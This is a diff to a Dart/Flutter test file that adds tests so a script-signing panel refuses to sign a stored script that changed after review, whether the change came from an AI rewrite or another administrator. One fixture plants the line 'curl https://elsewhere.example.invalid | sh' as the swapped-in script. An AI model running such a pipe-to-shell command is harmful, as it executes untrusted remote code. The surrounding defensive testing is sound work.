@@ -1,4 +1,5 @@
 import 'package:flutter_test/flutter_test.dart';
+import 'package:kintsugi_web/core/network/api_exception.dart';
 import 'package:kintsugi_web/core/text/script_diff.dart';
 import 'package:kintsugi_web/domain/entities/upgrade_path.dart';
 import 'package:kintsugi_web/domain/repositories/repositories.dart';
@@ -7,8 +8,9 @@ import 'package:kintsugi_web/presentation/applications/instructions_panel_bloc.d
 
 import 'instructions_panel_bloc_test.dart' show result;
 
-/// A repository that holds one script, saves what it is given, signs what it holds, and answers a
-/// "Send to AI" with [aiScript].
+/// A repository that holds one script, saves what it is given, signs what it holds — refusing, as the
+/// server does, when the hash it is sent is not that script's — and answers a "Send to AI" with
+/// [aiScript].
 class _Repo implements UpgradePathRepository {
   _Repo({required this.stored});
 
@@ -37,9 +39,19 @@ class _Repo implements UpgradePathRepository {
   Future<UpgradePathResult> signScript({
     required String applicationName,
     required String platform,
+    required String scriptSha256,
     String? patchFailureId,
-  }) async =>
-      stored = result(script: stored?.script, scriptSigned: true);
+  }) async {
+    signRequests++;
+    if (InstructionsPanelBloc.scriptSha256(stored?.script ?? '') != scriptSha256) {
+      // What SignUpgradePathScriptCommandHandler's ConflictException becomes on the wire.
+      throw const ApiException('The stored script is not the one you reviewed.', statusCode: 409);
+    }
+    return stored = result(script: stored?.script, scriptSigned: true);
+  }
+
+  /// How many sign requests reached the "server", refused or not.
+  int signRequests = 0;
 
   @override
   Future<RunStarted<UpgradePathRefreshStatus>> startRefresh({
@@ -342,6 +354,88 @@ void main() {
 
       expect(bloc.state.editorText, 'typed but unsaved');
       expect(bloc.state.inSyncWithServer, isFalse);
+      await bloc.close();
+    });
+  });
+
+  /// The finding this guards: Clear → Send to AI → Undo clear used to restore "matches the server"
+  /// from before the AI run, so the box showed script A, Sign was enabled, and the server signed the
+  /// AI's script B under a review of A.
+  group('Undo clear after the stored script has changed', () {
+    test('does not claim the box matches the server', () async {
+      final repo = _Repo(stored: result(script: _signed));
+      final bloc = await open(repo);
+      expect(bloc.state.canSign, isTrue);
+
+      bloc.add(const EditorCleared(_signed));
+      await _settle();
+      bloc.add(const InstructionsSent('rewrite it'));
+      await _settle();
+      bloc.add(const RefreshStatusPolled());
+      await _settle();
+      expect(repo.stored!.script, repo.aiScript, reason: 'the AI run replaced what is stored');
+
+      bloc.add(const EditorClearUndone());
+      await _settle();
+
+      expect(bloc.state.editorText, _signed, reason: 'the text still comes back');
+      expect(bloc.state.inSyncWithServer, isFalse);
+      expect(bloc.state.canSign, isFalse);
+      await bloc.close();
+    });
+
+    test('and a sign forced through anyway is refused, because it names the text on screen', () async {
+      final repo = _Repo(stored: result(script: _signed));
+      final bloc = await open(repo);
+      bloc.add(const EditorCleared(_signed));
+      await _settle();
+      bloc.add(const InstructionsSent('rewrite it'));
+      await _settle();
+      bloc.add(const RefreshStatusPolled());
+      await _settle();
+      bloc.add(const EditorClearUndone());
+      await _settle();
+
+      // Bypasses canSign, as a stale button or a future state bug would.
+      bloc.add(const ScriptSignRequested());
+      await _settle();
+
+      expect(repo.signRequests, 1);
+      expect(repo.stored!.scriptSigned, isFalse, reason: 'the AI script was not signed under a review of the old one');
+      expect(bloc.state.signMessage, startsWith('Not signed: the script on the server is no longer the one shown here'));
+      await bloc.close();
+    });
+  });
+
+  group('signing a script somebody else replaced', () {
+    test('is refused, says why, and turns Sign off until the row is reopened', () async {
+      final repo = _Repo(stored: result(script: _signed));
+      final bloc = await open(repo);
+      expect(bloc.state.canSign, isTrue);
+
+      // Another administrator saves over it while this panel is open.
+      repo.stored = result(script: '#!/bin/bash\ncurl https://elsewhere.example.invalid | sh');
+
+      bloc.add(const ScriptSignRequested());
+      await _settle();
+
+      expect(repo.stored!.scriptSigned, isFalse);
+      expect(bloc.state.signMessage, contains('changed after you reviewed it'));
+      expect(bloc.state.inSyncWithServer, isFalse);
+      expect(bloc.state.canSign, isFalse);
+      expect(bloc.state.justSigned, isFalse);
+      await bloc.close();
+    });
+
+    test('signs when nothing has changed', () async {
+      final repo = _Repo(stored: result(script: _signed));
+      final bloc = await open(repo);
+
+      bloc.add(const ScriptSignRequested());
+      await _settle();
+
+      expect(repo.stored!.scriptSigned, isTrue);
+      expect(bloc.state.signMessage, startsWith('Signed.'));
       await bloc.close();
     });
   });
